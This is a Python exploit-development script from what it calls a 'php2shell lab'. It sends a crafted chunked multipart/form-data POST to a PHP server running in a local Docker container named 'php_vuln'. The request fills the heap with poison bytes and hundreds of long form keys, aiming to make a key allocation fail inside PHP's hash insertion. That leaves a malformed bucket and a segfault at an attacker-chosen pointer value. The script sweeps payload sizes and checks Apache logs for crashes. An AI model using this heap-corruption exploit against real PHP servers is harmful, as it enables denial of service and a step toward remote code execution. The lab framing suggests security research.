#!/usr/bin/env python3
"""php2shell lab, oom14: V=1024 — between donation (1016) and headroom (12400).

Unified geometry law from oom8-13:
  value_need <= 1016 (freed-param donation) -> free-list re-feeds, no descent
  value_need > ~12400 (reachable headroom)  -> value dies first (12288 wall)
  V=1024 -> rounded need 1152: unfeedable, survivable -> monotone descent
  ~1152B/part -> headroom enters key kill-window (328B) mid-run at ~part 75
  -> key zend_string_init (328B) dies INSIDE add_to_hash (post-commit)
  -> malformed bucket -> teardown dtor -> SIGSEGV 0x0808080808080808
"""
import re
import socket
import subprocess
import sys
import time

UNIT = 128 * 1024
KEYRUN = 400
V = 1024
POISON = b"\x08"

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def part(name: bytes, val: bytes) -> bytes:
    return (b"--BOUND\r\nContent-Disposition: form-data; name=\"" + name +
            b"\"\r\n\r\n" + val + b"\r\n")

def build(rem: int) -> list[bytes]:
    ps = [part(b"n0", POISON * (256 * 1024)), part(b"n0", POISON * (256 * 1024))]
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 475 * UNIT + rem - 9 * UNIT - 2 * (256 * 1024)
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(KEYRUN):
        nm = POISON * (280 + (k % 40)) + b"%d" % k   # distinct, varied length
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=120)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def alloc_n(text: bytes):
    m = re.search(rb"tried to allocate (\d+)", text)
    return int(m.group(1)) if m else None

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)
    rems = [65400, 65300, 65200, 65450, 65350, 65250, 65480, 65150]
    for rem in rems:
        restart()
        fatal, text = send(port, build(rem))
        a = alloc_n(text) if fatal else None
        log(f"rem={rem}: fatal={fatal} alloc={a}")
        if fatal and a is not None and a < 1024:
            log(f"*** KEY-ALLOC CROSSING rem={rem} alloc={a} — segfault check ***")
            time.sleep(1)
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c",
                "grep -E 'Segmentation|SIGSEGV' /var/log/apache2/error.log | tail -3"],
                capture_output=True, text=True)
            log(r.stdout or "(no segfault lines)")
            return
    log("sweep done — check error.log")

if __name__ == "__main__":
    main()
